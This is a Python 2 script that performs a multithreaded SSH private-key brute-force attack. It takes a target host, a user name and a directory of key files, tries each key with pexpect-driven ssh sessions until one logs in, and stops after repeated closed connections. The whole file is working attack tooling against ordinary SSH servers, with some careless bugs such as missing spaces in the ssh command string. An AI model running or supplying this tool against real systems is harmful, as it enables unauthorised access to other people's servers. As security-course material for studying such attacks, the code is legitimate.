import pexpect
import optparse
import os
from threading import *

maxconnections = 5

connection_lock = BoundedSemaphore(value=maxconnections)
Stop = False
Fails = 0

def connection(user, host, keyfile, release):
    global Stop
    global Fails

    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = '-o PasswordAuthentication=no'
        connStr = 'ssh ' + user + '@' + host + '-i' + keyfile+opt
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#', ])
        if ret == 2:
            print '[-] Adding Host to !/.ssh/known_hosts'
            child.sendline('yes')
            connection(user, host, keyfile, False)
        elif ret == 3:
            print '[-] Connection Closed By Remote Host'
            Fails += 1
        elif ret > 3:
            print '[+] Succee. '+str(keyfile)
            Stop = True

    finally:
        if release:
            connection_lock.release()


def main():
    parser = optparse.OptionParser('usage %prog ' + '-H <target host> -u <user> -d <passDir>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-d', dest='passDir', type='string', help='specify directory with keys')
    parser.add_option('-u', dest='user', type='string', help='specify the user')

    (options, args) = parser.parse_args()
    host = options.tgtHost
    passDir = options.passDir
    user = options.user

    if host == None or passDir == None or user == None:
        print parser.usage
        exit(0)

    for filename in os.listdir(passDir):
        if Stop:
            print '[*] Existing: key Found.'
            exit(0)
        if Fails > 5:
            print '[!] Existing Too Many Connections Closed by Remote Host.'
            exit(0)
        connection_lock.acquire()
        fullpath = os.path.join(passDir, filename)
        print '[-] Testing keyfile '+ str(fullpath)
        t = Thread(target=connection, args=(user, host, fullpath, True))
        child = t.start()


if __name__ == '__main__':
    main()